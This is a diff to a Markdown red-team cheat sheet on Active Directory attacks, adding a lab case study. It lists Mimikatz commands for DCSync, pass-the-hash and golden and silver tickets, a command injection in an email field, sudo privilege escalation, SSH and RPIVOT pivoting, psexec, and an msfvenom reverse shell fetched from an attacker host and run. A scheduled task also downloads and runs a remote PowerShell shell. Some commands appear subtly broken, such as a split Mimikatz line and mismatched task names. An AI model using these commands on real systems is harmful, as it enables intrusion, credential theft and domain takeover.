@@ -51,6 +51,13 @@
   - [Silver Ticket Attack](#silver-ticket-attack)
     - [Command Explanation](#command-explanation-1)
     - [Command Execution using Silver Ticket](#command-execution-using-silver-ticket)
+  - [Case Study](#case-study)
+    - [Initial Access](#initial-access)
+    - [Enumeration](#enumeration)
+  - [Pivoting and Lateral Movement](#pivoting-and-lateral-movement)
+    - [SSH Pivoting](#ssh-pivoting)
+    - [RPIVOT Pivoting](#rpivot-pivoting)
+    - [Internal Access and Post-Exploitation](#internal-access-and-post-exploitation)
 
 ### Bastion-Host (Jump-Server):
 
@@ -255,7 +262,7 @@
 - Below command will scan IP addresses 10.1.1.1-5 and some specific common TCP ports.
 
 ```powershell
- 1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null} 
+ 1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null}
 ```
 
 - Invoking a PowerShell Module 
@@ -440,7 +447,8 @@ klist
 - Export ticket using Mimikatz : 
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::list /export"'
+Invoke-Mimikatz -Command 
+"kerberos::list /export"
 ```
 
 - Now, Crack the Service account password using tgsrepcrack.py
@@ -502,7 +510,7 @@ Invoke-Mimikatz –DumpCreds –ComputerName @(“comp1”,”comp2”)
 - Most famous Pass-the-hash attack:
 
 ```powershell
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp/hash: /run:powershell.exe"'
+Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp/hash: /run:powershell.exe"
 ```
 
 ### DCSYNC Attack
@@ -517,7 +525,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:cyberwarfar
 - Command : 
 
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
+Invoke-Mimikatz -Command "lsadump::dcsync /user:cyberwarfare\krbtgt"
 ```
 
 ### Unconstrained Delegation
@@ -538,19 +546,19 @@ Get-NetComputer –unconstrained -verbose
   - Extract the Domain Admin TGT : 
 
 ```powershell
-Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
+Invoke-Mimikatz –Command "sekurlsa::tickets /export"
 ```
 
   - Re-use the ticket to perform other operations as Domain Admin : 
 
 ```powershell
-Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
+Invoke-Mimikatz –Command "kerberos::ptt ticket.kirbi"
 ```
 
   - Run DCSYNC Attack : 
 
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
+Invoke-Mimikatz -Command "lsadump::dcsync /user:cyberwarfare\krbtgt"
 ```
 
 ### Persistence & Exfiltrate
@@ -586,7 +594,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
 - Extract krbtgt account hash :
 
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
+Invoke-Mimikatz -Command "lsadump::dcsync /user:cyberwarfare\krbtgt"
 ```
 
 - Domain SID : 
@@ -598,7 +606,7 @@ whoami /all (of a domain user)
 - Adversary Forge Golden ticket in a Domain as follows : 
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxx-yyyyy-xxxxx /krbtgt:xxxxxxxxxxxxxxxxxx /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command "kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxx-yyyyy-xxxxx /krbtgt:xxxxxxxxxxxxxxxxxx /startoffset:0 /endin:600 /renewmax:10080 /ptt"
 ```
 
 #### Command Explanation
@@ -637,8 +645,8 @@ whoami /all (of a domain user)
 - Adversary Forge Golden ticket in a Domain as follows : 
 
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\enterprise-dc$"' 
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-yyyyyyyy-zzzzzzzzzz-xxxxxx /target:enterprise-dc.cyberwarfare.corp /service:cifs /rc4:<HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command "lsadump::dcsync /user:cyberwarfare\enterprise-dc$" 
+Invoke-Mimikatz -Command "kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-yyyyyyyy-zzzzzzzzzz-xxxxxx /target:enterprise-dc.cyberwarfare.corp /service:cifs /rc4:<HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"
 ```
 
 #### Command Explanation
@@ -663,7 +671,225 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwar
 - Schedule and execute a task on Remote Server : 
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxxx-yyyy-zzzzz /target:exterprise-dc.cyberwarfare.corp /service:HOST /rc4:xxxxx /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command "kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxxx-yyyy-zzzzz /target:exterprise-dc.cyberwarfare.corp /service:HOST /rc4:xxxxx /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"
 schtasks /create /S enterprise-dc.cyberwarfare.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN “lateral" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.1:8000/Invoke-PowerShellTcp.ps1'')'"
 schtasks /Run /S enterprise-dc.cyberwarfare.corp /TN "STCheck"
 ```
+
+## Case Study
+
+### Initial Access
+
+**Scope:**
+
+*   VPN IP Range: `10.10.200.0/24`
+*   External IP range in scope: `192.168.80.0/24`
+*   Internal IP range in scope: `192.168.98.0/24`
+
+**Scanning:**
+
+```bash
+nmap -sn 192.168.80.0/24
+```
+
+*   `192.168.80.1` is up
+*   `192.168.80.10` is up
+
+```bash
+nmap -sC -sV 192.168.80.10
+```
+
+*   `21/tcp` ftp vsftpd 3.0.3 (Anonymous FTP login is Allowed)
+*   `22/tcp` ssh OpenSSH 7.6p1
+*   `80/tcp` http Apache httpd/2.4.29
+
+**Exploitation:**
+
+1.  Create an account on `http://192.168.80.10/index.php`.
+2.  Intercept the request with BurpSuite and test for command injection in the email field.
+3.  `EMAIL=ls` -> Works.
+4.  `EMAIL=cat /etc/passwd` -> Works.
+5.  Found credentials in the output:
+    *   Username: `privilege`
+    *   Password: `Admin@962`
+6.  SSH into the machine:
+
+    ```bash
+    ssh privilege@192.168.80.10
+    ```
+
+### Enumeration
+
+**Initial Foothold:**
+
+*   `privilege@Linux1:~$`
+*   No internet connection (`ping google.com` fails).
+
+**Transferring Tools:**
+
+1.  Start a Python HTTP server on the attacker machine to serve reconnaissance tools (`linpeas.sh`, `PowerView.ps1`, etc.).
+2.  On the victim machine, download `linpeas.sh`:
+
+    ```bash
+    curl http://10.10.200.2:8000/linpeas.sh >> lin.sh
+    chmod +x lin.sh
+    ```
+
+**Privilege Escalation (Manual):**
+
+*   `sudo -l` shows `(ALL : ALL) ALL`.
+*   `sudo su` to get a root shell.
+*   Alternatively, `sudo vi` and then `:!/bin/bash` to get a root shell.
+
+**Network Enumeration (Internal):**
+
+*   `ip a` shows two interfaces:
+    *   `ens160: 192.168.98.15/24`
+    *   `ens192: 192.168.80.10/24`
+*   Scan the internal network:
+
+    ```bash
+    nmap -sn 192.168.98.0/24
+    ```
+
+    *   `192.168.98.2` is up
+    *   `192.168.98.15` is up
+    *   `192.168.98.30` is up
+*   Scan the discovered hosts:
+
+    *   `nmap -sV -sC 192.168.98.2` (Likely a Domain Controller)
+        *   `53/tcp` domain (Microsoft DNS)
+        *   `88/tcp` kerberos-sec (Microsoft Windows Kerberos)
+        *   `389/tcp` ldap (Microsoft Windows Active Directory LDAP, Domain: `warfare.corp0`)
+    *   `nmap -sV -sC 192.168.98.30` (Likely a file server or workstation)
+        *   `135/tcp` msrpc
+        *   `139/tcp` netbios-ssn
+        *   `445/tcp` microsoft-ds
+
+**Credential Discovery:**
+
+*   Found credentials in `.vnc_log`:
+    *   user: `child\employee`
+    *   Pass: `Doctor@963`
+*   Found `places.sqlite` (Firefox history) in the user's home directory. `lin.sh` output also pointed to this.
+*   `sqlite3 places.sqlite` and `select * from moz_bookmarks;` could reveal interesting information.
+
+## Pivoting and Lateral Movement
+
+This section details pivoting techniques for accessing internal networks and lateral movement methods.
+
+### SSH Pivoting
+
+SSH pivoting allows tunneling traffic through a compromised machine to reach otherwise inaccessible networks.
+
+- **ProxyChains Configuration**:
+  Modify the `/etc/proxychains.conf` configuration file.
+  ```bash
+  sudo nano /etc/proxychains.conf
+  ```
+  Ensure the following lines are present to use the SOCKS tunnel.
+  ```
+  socks5 127.0.0.1 9050
+  socks4 127.0.0.1 9050
+  ```
+
+- **Creating the SSH Tunnel**:
+  Create a dynamic SOCKS proxy on local port 9050 that relays traffic through the `privilege@192.168.80.10` machine.
+  ```bash
+  ssh -D 9050 privilege@192.168.80.10
+  ```
+
+- **Using ProxyChains**:
+  In a new terminal, prefix commands with `proxychains` to route them through the tunnel.
+  ```bash
+  # A simple ping through proxychains may fail as ICMP is not proxied by default.
+  proxychains ping 192.168.98.30
+
+  # Test connectivity on a specific port (e.g., 445/SMB).
+  proxychains nc 192.168.98.30 445
+
+  # Scan the target's ports through the tunnel.
+  proxychains nmap -sT 192.168.98.30
+  ```
+
+### RPIVOT Pivoting
+
+RPIVOT is a reverse pivot tool, useful when the compromised machine cannot be reached directly from the attacker's network.
+
+- **Setting up the RPIVOT Server (Attacker)**:
+  The server listens for incoming client connections and relays traffic through a local proxy (like our SSH tunnel).
+  ```bash
+  python2 server.py --server-port 9980 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
+  ```
+
+- **Running the RPIVOT Client (Victim)**:
+  The client connects to the attacker's server.
+  ```bash
+  curl http://10.10.200.2/rpivot.zip
+  python /rpivot/client.py --server-ip 10.10.200.2 --server-port 9980
+  ```
+
+- **Scanning through the RPIVOT Pivot**:
+  Use `proxychains` to scan the internal network through the new route.
+  ```bash
+  proxychains nmap -sn 192.168.98.30
+  proxychains nmap -sT 192.168.98.30
+  ```
+
+### Internal Access and Post-Exploitation
+
+Once the pivot is established, these commands allow interaction with the internal network.
+
+- **Using Impacket Tools**:
+  Impacket is a collection of Python scripts for working with network protocols.
+  ```bash
+  # Activate the Python virtual environment
+  source ~/.venv/bin/activate
+  python3 -m pip install impacket
+
+  # Use psexec.py to get a shell via SMB
+  proxychains psexec.py 'child/john:passjohn@192.168.98.30'
+  ```
+
+- **Enumeration with CrackMapExec (CME)**:
+  CME automates security assessment of large Active Directory networks.
+  ```bash
+  # Clone and install CME
+  git clone https://github.com/byt3bl33d3r/CrackMapExec
+  cd cme
+  poetry install
+
+  # Run SMB enumerations
+  proxychains poetry run cme smb 192.168.98.30 -u employee -p 'password'
+  proxychains poetry run cme smb 192.168.98.2 -u employee -p 'password'
+  ```
+
+- **Internal Reconnaissance Commands (Post-Access)**:
+  Once a shell is obtained on an internal machine.
+  ```bash
+  whoami
+  net user /dom
+  net group /dom
+  ping cdc.child.warfare.corp
+  ```
+
+- **Creating a Reverse Shell**:
+  Generate a payload with `msfvenom`, host it, and execute it on the target.
+  ```bash
+  # Generate payload (attacker)
+  msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.200.2 LPORT=9990 -f exe -o rev.exe
+
+  # Start a listener (attacker)
+  nc -nvlp 9990
+
+  # Download and execute the payload (victim)
+  iwr http://10.10.200.2:8000/rev.exe -OutFile C:\Users\john\Downloads\rev.exe
+  C:\Users\john\Downloads\rev.exe
+  ```
+
+- **Additional Active Directory Enumeration**:
+  ```bash
+  net user john /dom
+  net user corphead /dom
+  net localgroup Administrators
+  ```
